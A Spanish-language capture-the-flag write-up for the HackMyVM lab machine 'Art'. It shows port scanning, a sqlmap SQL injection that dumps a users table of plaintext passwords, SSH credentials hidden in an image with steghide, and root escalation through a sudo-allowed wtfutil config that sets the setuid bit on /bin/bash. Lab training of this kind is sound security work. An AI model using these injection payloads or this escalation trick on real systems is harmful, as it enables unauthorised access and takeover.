---
icon: flag
---

# Art HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-19 03:22 EDT
Nmap scan report for 192.168.5.42
Host is up (0.00067s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 45:42:0f:13:cc:8e:49:dd:ec:f5:bb:0f:58:f4:ef:47 (RSA)
|   256 12:2f:a3:63:c2:73:99:e3:f8:67:57🆎29:52:aa:06 (ECDSA)
|_  256 f8:79:7a:b1:a8:7e:e9:97:25:c3:40:4a:0c:2f:5e:69 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:44:E2:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
```

Veremos el puerto `80` que aloja una pagina web, si entramos a ella veremos varias imagenes pero nada interesantes, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.42/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 170]

```

Pero no veremos nada interesante, si inspeccionamos el codigo de la pagina veremos lo siguiente:

```html
<!-- Need to solve tag parameter problem. -->
```

Veremos que nos esta dando una pista del parametro `tag` por lo que vamos a intentar realizar una busqueda de algun `LFI` con dicho parametro.

Pero veremos que no tendremos exito por lo que vamos a probar a realizar un `SQLi` desde el parametro a ver si hay suerte.

## sqlmap

Vamos abrir `BurpSuite`, desde la `URL` pondremos lo siguiente:

```
URL = http://<IP>/index.php?tag=sqli
```

Estando a la escucha de cualquier peticion con `BurpSuite` capturaremos la peticion dandole a enviar, quedando algo asi:

> request.txt

```
GET /index.php?tag=sqli HTTP/1.1
Host: 192.168.5.42
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Ahora vamos a ejecutar el `sqlmap` a ver si encuentra algo...

```shell
sqlmap -r request.txt --dbs --batch
```

Info:

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:28:24 /2025-06-19/

[03:28:24] [INFO] parsing HTTP request from 'request.txt'
[03:28:24] [INFO] testing connection to the target URL
[03:28:24] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:28:24] [INFO] testing if the target URL content is stable
[03:28:25] [INFO] target URL content is stable
[03:28:25] [INFO] testing if GET parameter 'tag' is dynamic
[03:28:25] [WARNING] GET parameter 'tag' does not appear to be dynamic
[03:28:25] [WARNING] heuristic (basic) test shows that GET parameter 'tag' might not be injectable
[03:28:25] [INFO] testing for SQL injection on GET parameter 'tag'
[03:28:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:28:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:28:25] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[03:28:25] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[03:28:25] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[03:28:25] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[03:28:25] [INFO] testing 'Generic inline queries'
[03:28:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[03:28:25] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[03:28:25] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[03:28:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:28:35] [INFO] GET parameter 'tag' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[03:28:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:28:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[03:28:35] [INFO] target URL appears to be UNION injectable with 3 columns
[03:28:35] [INFO] GET parameter 'tag' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'tag' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
---
Parameter: tag (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: tag=sqli' AND (SELECT 9943 FROM (SELECT(SLEEP(5)))KblS) AND 'bZbx'='bZbx

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: tag=sqli' UNION ALL SELECT NULL,CONCAT(0x71716b7071,0x51574e7344474e6e5a6d6f4641654d4b7a7744467477744d6b555775435062475542566b7a534b50,0x71766b7171),NULL-- -
---
[03:28:35] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[03:28:35] [INFO] fetching database names
available databases [2]:
[*] gallery
[*] information_schema

[03:28:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.42'

[*] ending @ 03:28:35 /2025-06-19/
```

Vemos que ha funcionado, por lo que nos interesa la `DDBB` llamada `gallery`, vamos a ver que tablas tiene.

```shell
sqlmap -r request.txt --dbs --batch -D gallery --threads 10 --tables
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[(]_____ ___ ___  {1.9.2#stable}                                                                                                                     
|_ -| . ["]     | .'| . |                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:32:18 /2025-06-19/

[03:32:18] [INFO] parsing HTTP request from 'request.txt'
[03:32:18] [INFO] resuming back-end DBMS 'mysql' 
[03:32:18] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: tag (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: tag=sqli' AND (SELECT 9943 FROM (SELECT(SLEEP(5)))KblS) AND 'bZbx'='bZbx

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: tag=sqli' UNION ALL SELECT NULL,CONCAT(0x71716b7071,0x51574e7344474e6e5a6d6f4641654d4b7a7744467477744d6b555775435062475542566b7a534b50,0x71766b7171),NULL-- -
---
[03:32:18] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[03:32:18] [INFO] fetching database names
available databases [2]:
[*] gallery
[*] information_schema

[03:32:18] [INFO] fetching tables for database: 'gallery'
Database: gallery
[2 tables]
+-------+
| art   |
| users |
+-------+

[03:32:18] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.42'

[*] ending @ 03:32:18 /2025-06-19/
```

Veremos que hay `2` tablas bastante interesantes, vamos a extraer la informacion de la de `users` a ver que vemos.

```shell
sqlmap -r request.txt --dbs --batch -D gallery -T users --threads 10 --dump
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___["]_____ ___ ___  {1.9.2#stable}                                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:33:26 /2025-06-19/

[03:33:26] [INFO] parsing HTTP request from 'request.txt'
[03:33:26] [INFO] resuming back-end DBMS 'mysql' 
[03:33:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: tag (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: tag=sqli' AND (SELECT 9943 FROM (SELECT(SLEEP(5)))KblS) AND 'bZbx'='bZbx

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: tag=sqli' UNION ALL SELECT NULL,CONCAT(0x71716b7071,0x51574e7344474e6e5a6d6f4641654d4b7a7744467477744d6b555775435062475542566b7a534b50,0x71766b7171),NULL-- -
---
[03:33:26] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[03:33:26] [INFO] fetching database names
available databases [2]:
[*] gallery
[*] information_schema

[03:33:26] [INFO] fetching columns for table 'users' in database 'gallery'
[03:33:26] [INFO] fetching entries for table 'users' in database 'gallery'
Database: gallery
Table: users
[8 entries]
+----+-----------------+--------+
| id | pass            | user   |
+----+-----------------+--------+
| 1  | realpazz        | mina   |
| 2  | mncxzKLLJDS     | me     |
| 3  | 987dsKLDSOIU    | lula   |
| 4  | BDSAOIUYEW      | notme  |
| 5  | dsOIUSDAOydsa   | mona   |
| 6  | EWQUDSAdaSDSA=  | admin  |
| 7  | VCXddsaEWQdsa_D | lila   |
| 8  | DSAewqDSAewq    | root   |
+----+-----------------+--------+

[03:33:26] [INFO] table 'gallery.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.5.42/dump/gallery/users.csv'
[03:33:26] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.42'

[*] ending @ 03:33:26 /2025-06-19/
```

Veremos que tendremos varias credenciales, pero si las probamos por `SSH` veremos que no nos sirve ninguna, por lo que vamos a investigar la otra tabla de la `DDBB`.

```shell
sqlmap -r request.txt --dbs --batch -D gallery -T art --threads 10 --dump
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.9.2#stable}                                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                                    
|___|_  [)]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:34:47 /2025-06-19/

[03:34:47] [INFO] parsing HTTP request from 'request.txt'
[03:34:47] [INFO] resuming back-end DBMS 'mysql' 
[03:34:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: tag (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: tag=sqli' AND (SELECT 9943 FROM (SELECT(SLEEP(5)))KblS) AND 'bZbx'='bZbx

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: tag=sqli' UNION ALL SELECT NULL,CONCAT(0x71716b7071,0x51574e7344474e6e5a6d6f4641654d4b7a7744467477744d6b555775435062475542566b7a534b50,0x71766b7171),NULL-- -
---
[03:34:47] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[03:34:47] [INFO] fetching database names
available databases [2]:
[*] gallery
[*] information_schema

[03:34:47] [INFO] fetching columns for table 'art' in database 'gallery'
[03:34:47] [INFO] fetching entries for table 'art' in database 'gallery'
Database: gallery
Table: art
[5 entries]
+----+-----------+---------------+
| id | tag       | image         |
+----+-----------+---------------+
| 1  | beautiful | abc321.jpg    |
| 2  | beautiful | jlk19990.jpg  |
| 3  | beautiful | ertye.jpg     |
| 4  | beautiful | zzxxccvv3.jpg |
| 5  | beauty    | dsa32.jpg     |
+----+-----------+---------------+

[03:34:47] [INFO] table 'gallery.art' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.5.42/dump/gallery/art.csv'
[03:34:47] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.42'

[*] ending @ 03:34:47 /2025-06-19/
```

Veremos que hay una imagen que nos llama la atencion y es la llamada `dsa32.jpg` ya que es la unica que en el `tag` tiene otro nombre, vamos a ver si podemos sacarla algo de informacion desde la propia imagen.

```
URL = http://<IP>/index.php?tag=beauty
```

## Escalate user lion

### steghide

Nos aparece dicha imagen, por lo que vamos a descargarnosla, una vez echo eso, vamos a utilizar la herramienta `steghide` para poder extraer algun archivo si contuviera alguno de esta forma.

```shell
steghide extract -sf dsa32.jpg
```

Dejamos la contraseña `vacia`...

Info:

```
Enter passphrase: 
wrote extracted data to "yes.txt".
```

Veremos que efectivamente nos extrajo un archivo llamado `yes.txt`, si lo leemos veremos que contiene lo siguiente:

```
lion/shel0vesyou
```

Vamos a probar dichas credenciales mediante el `SSH`.

### SSH

```shell
ssh lion@<IP>
```

Metemos como contraseña `shel0vesyou` y veremos que estamos dentro.

Info:

```
Linux art 5.10.0-16-amd64 #1 SMP Debian 5.10.127-2 (2022-07-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug  3 11:18:18 2022 from 192.168.1.51
lion@art:~$ whoami
lion
```

Por lo que leeremos la `flag` del usuario.

> user.txt

```
HMVygUmTyvRPWduINKYfmpO
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for lion on art:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lion may run the following commands on art:
    (ALL : ALL) NOPASSWD: /bin/wtfutil
```

Vemos que podemos ejecutar el binario `wtfutil` como el usuario `root`, por lo que podremos hacer lo siguiente.

Sabemos que el binario puede cargar archivos de configuracion en `.yml` por lo que si podemos ejecutarlo como `root` podremos crear un `config.yml` en el que ejecute un comando que nosotros queramos, vamos a buscar un ejemplo de `.yml` a ver que encontramos.

URL = [Ejemplo de config.yml GitHub](https://github.com/wtfutil/wtf/blob/master/_sample_configs/sample_config.yml)

En ese ejemplo podremos ver como ejecuta comandos desde la configuracion, por lo que nosotros vamos a crear algo asi.

```shell
cd /tmp
nano config.yml

#Dentro del nano
wtf:
  grid:
    columns: [50]
    rows: [3]
  mods:
    root_shell:
      type: cmdrunner
      cmd: "/bin/chmod"
      args: ["u+s", "/bin/bash"]
      enabled: true
      position:
        top: 0
        left: 0
        height: 1
        width: 1
      refreshInterval: 300
```

Lo guardamos y ejecutamos el binario `wtfutil` para que cargue dicha configuracion de la siguiente forma:

```shell
sudo /bin/wtfutil --config=/tmp/config.yml
```

Una vez que lo ejecutemos veremos que nos aparece una interfaz grafica en terminal de nuestro comando ejecutado y del codigo con numero `1` que significa que se ejecuto de forma exitosa, por lo que haremos `Ctrl+C` y probaremos a listar la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
```

Veremos que se ha ejecutado de forma correcta por lo que podremos ser `root` de esta forma.

```shell
bash -p
```

Info:

```
bash-5.1# whoami
root
```

Con esto ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
mZxbPCjEQYOqkNCuyIuTHMV
```
